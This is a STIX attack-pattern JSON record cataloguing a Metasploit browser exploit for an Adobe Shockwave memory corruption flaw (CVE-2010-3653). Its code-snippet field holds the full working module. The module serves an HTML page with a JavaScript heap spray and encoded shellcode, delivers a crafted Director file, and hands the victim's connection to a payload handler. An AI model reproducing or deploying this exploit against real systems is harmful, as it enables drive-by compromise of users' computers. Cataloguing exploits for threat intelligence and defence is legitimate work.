{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9953a995-c3cd-4a81-bf6a-e6dc9b2b1a9b",
    "created": "2024-08-14T16:40:19.611413Z",
    "modified": "2024-08-14T16:40:19.611417Z",
    "name": "Adobe Shockwave rcsL Memory Corruption",
    "description": " This module exploits a weakness in the Adobe Shockwave player's handling of Director movies (.DIR). A memory corruption vulnerability occurs through an undocumented rcsL chunk.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_shockwave_rcsl_corruption.rb",
            "external_id": "adobe_shockwave_rcsl_corruption.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3653"
        },
        {
            "source_name": "reference",
            "url": "http://www.adobe.com/support/security/bulletins/apsb10-25.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe Shockwave rcsL Memory Corruption',\n      'Description'    => %q{\n          This module exploits a weakness in the Adobe Shockwave player's handling of\n        Director movies (.DIR). A memory corruption vulnerability occurs through an undocumented\n        rcsL chunk.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>'],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3653'],\n          [ 'OSVDB', '68803'],\n          [ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-25.html' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic',     { 'Ret' => 0x0a0a0a0a } ], # tested on XP SP2 and XP SP3\n        ],\n      'DisclosureDate' => '2010-10-21',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  #\n  # When exploit is called, load the exploit.dir file\n  #\n  def exploit\n\n    path = File.join( Msf::Config.data_directory, \"exploits\", \"shockwave_rcsl.dir\" )\n    fd = File.open( path, \"rb\" )\n    @dir_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    dirname\t= get_resource() + \"/\" + rand_text_alpha(rand(20))\n    shellcode_rand = rand_text_alpha(rand(20))\n\n    # payload encoding\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # build the exploit\n    content = <<-EOS\n<html>\n<head>\n<title>msf</title>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n<script>\n#{shellcode_rand} = unescape('#{shellcode}');\n\nnops=unescape('%u0a0a%u0a0a');\nheadersize =20;\nslackspace= headersize + #{shellcode_rand}.length;\nwhile(nops.length< slackspace) nops+= nops;\nfillblock= nops.substring(0, slackspace);\nblock= nops.substring(0, nops.length- slackspace);\nwhile( block.length+ slackspace<0x200000) block= block+ block+ fillblock;\nmemory=new Array();\nfor( counter=0; counter<200; counter++) memory[counter]= block + #{shellcode_rand};\n</script>\n</head>\n<body bgColor=\"#FFFFFF\">\n<object classid=\"clsid:233C1507-6A77-46A4-9443-F871F945D258\"\ncodebase=\"http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593\"\nID=Abysssec width=600 height=430 VIEWASTEXT>\n<param name=src value=\"#{dirname}.DIR\">\n<param name=swRemote value=\"swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' \">\n<param name=swStretchStyle value=fill>\n<param name=PlayerVersion value=11>\n<PARAM NAME=bgColor VALUE=#FFFFFF>\n<embed src=\"#{dirname}.DIR\" bgColor=#FFFFFF  width=600 height=430 swRemote=\"swSaveEnabled='true' swVolume='true' swRestart='true'\nswPausePlay='true' swFastForward='true' swContextMenu='true' \" swStretchStyle=fill\ntype=\"application/x-director\" PlayerVersion=11 pluginspage=\"http://www.macromedia.com/shockwave/download/\"></embed>\n</object>\n</body>\n</html>\nEOS\n\n    # Transmit the response to the client\n    path = request.uri\n    if (path =~ /\\.DIR/i)\n      print_status(\"Sending exploit DIR\")\n      send_response(cli, @dir_data, { 'Content-Type' => 'application/octet-stream' })\n    else\n      print_status(\"Sending HTML\")\n      send_response_html(cli, content)\n    end\n\n    # Handle the payload\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-21",
    "x_mitre_platforms": [
        "win'"
    ]
}